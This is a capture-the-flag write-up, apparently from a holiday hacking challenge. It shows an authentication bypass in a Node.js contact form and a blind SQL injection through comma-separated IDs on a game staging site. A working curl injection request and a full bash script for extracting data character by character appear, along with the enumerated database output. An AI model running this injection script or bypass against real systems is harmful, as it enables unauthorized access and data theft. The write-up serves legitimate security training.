There is an authentication flaw in the method (see server.js). By posting the same email a second time we will be authenticated.

```javascript
..
app.post('/postcontact', function(req, res, next){
    var rowlength = rows.length;
    if (rowlength >= "1"){
      session = req.session;
      session.uniqueID = email;
      req.flash('info', 'Email Already Exists');
      res.redirect("/contact");
    } else {
```

This way we get a valid session.uniqueID which can bypass the authentication. By further looking at the code it seems the details page allows SQL injection which can be triggered by supplying multiple comma separated values. This is quite tricky as the web page does not use a comma separated list so without the source code that SQLi most likely wouldn't be noticed.

```bash
┌──(ben㉿42c96d2)-[~/Work]
└─$ curl -L --cookie "_csrf=kocuNDU9QMlSalYi03IpcY4o;" --cookie "connect.sid=s%3Aa7wP3VhClIjx8eHUMQ4INyOilSc3NYgz.eNDqZCVlX7GNlBuI4F%2BZK3Sin%2F8koFzQoT4kR4mTw6k" "https://staging.jackfrosttower.com/detail/1000,1001%20OR%20id=%20(select%20count(*)%20from%20emails)" 2>/dev/null| grep ">Edit<" | cut -f 2 -d "\"" | cut -f 3 -d "/"
14
```

Abusing that SQLi with sqlmap does not bring any success as sqlmap has its problems with that comma separated list. I have written a script to make database enumeration in that case a lot easier.

```bash
┌──(ben㉿42c96d2)-[~/Work]
└─$ cat frosttest.sh               
#!/bin/bash
row=$4
table=$1
column=$2
where=$3
good1=110
good2=112
maxrow=$5
csrf="e5bcyuMyt8FIPF22ZJcFbft1rRObQRB2."
sid="s%3A0kBa0_sU0UezHTC3yjtJtDXB1OPe8aJS.qu0IwkV2Iy6TLeB2X2XRYml%2BY7tQZkH84sFr3ifKb50"
echo "Analyzing table $table and column $column..."
while [ $row -le $maxrow ]
do
    cont=1
    position=1
    echo -n "Row ID $row: "
    while [ $cont = 1 ]
    do
        cont=0
        #for i in a b c d e f g h i j k l m n o p q r s t u v w x y z 1 2 3 4 5 6 7 8 9 0
        ascii=32
        while [ $ascii -le 127 ]
        do 
            counter=`curl -L --cookie "_csrf=$csrf" --cookie "connect.sid=$sid" "https://staging.jackfrosttower.com/detail/$good1,$good2%20AND%20%22$ascii%22%20=%20(select%20(ascii(substring($column%20from%20$position%20for%201)))%20%20from%20$table$where%20limit%201%20OFFSET%20$row)" 2>/dev/null | grep ">Edit<" | cut -f 2 -d "\"" | wc -l`
            if [ "x $counter x" == "x 2 x" ]
            then
                #echo -n $ascii
                echo $ascii | awk '{printf("%c",$1)}'
                cont=1
                position=$(echo $position + 1 | bc)
            fi
            ascii=$(echo $ascii + 1 | bc)
        done
    done
    row=$(echo $row + 1 | bc)
    echo ""
done
```

Let's enumerate the database using the MySQL information schema tables.

```bash
┌──(ben㉿42c96d2)-[~/Work]
└─$ ./frosttest.sh information_schema.schemata schema_name "%20" 0 10                130 ⨯
Analyzing table information_schema.schemata and column schema_name...
Row ID 0: information_schema.
Row ID 1: encontact.
Row ID 2: .
```

```bash
┌──(ben㉿42c96d2)-[~/Work]
└─$ ./frosttest.sh information_schema.tables table_name "%20where%20table_schema%3d%22encontact%22" 0 100
Analyzing table information_schema.tables and column table_name...
Row ID 0: users
Row ID 1: todo
Row ID 2: emails
Row ID 3: uniquecontact
Row ID 4: 
```

```bash
┌──(ben㉿42c96d2)-[~/Work]
└─$ ./frosttest.sh information_schema.columns column_name "%20where%20table_schema%3d%22encontact%22%20and%20table_name%3d%22todo%22" 0 100
Analyzing table information_schema.columns and column column_name...
Row ID 0: id
Row ID 1: note
Row ID 2: completed
Row ID 3: 
```

```bash
┌──(ben㉿42c96d2)-[~/Work]
└─$ ./frosttest.sh todo note "%20" 0 10                               130 ⨯
Analyzing table todo and column note...
Row ID 0: Buy up land all around Santa's Castle
Row ID 1: Build bigger and more majestic tower next to Santa's
Row ID 2: Erode Santa's influence at the North Pole via FrostFest, the greatest Con in history
Row ID 3: Dishearten Santa's elves and encourage defection to our cause
Row ID 4: Steal Santa's sleigh technology and build a competing and way better Frosty present delivery vehicle
Row ID 5: Undermine Santa's ability to deliver presents on 12/24 through elf staff shortages, technology glitches, and assorted mayhem
Row ID 6: Force Santa to cancel Christmas
Row ID 7: SAVE THE DAY by delivering Frosty presents using merch from the Frost Tower Gift Shop to children world-wide... so the whole world sees that Frost saved the Holiday Season!!!! Bwahahahahaha!
Row ID 8: With Santa defeated, offer the old man a job as a clerk in the Frost Tower Gift Shop so we can keep an eye on him
Row ID 9: 
Row ID 10:  
```
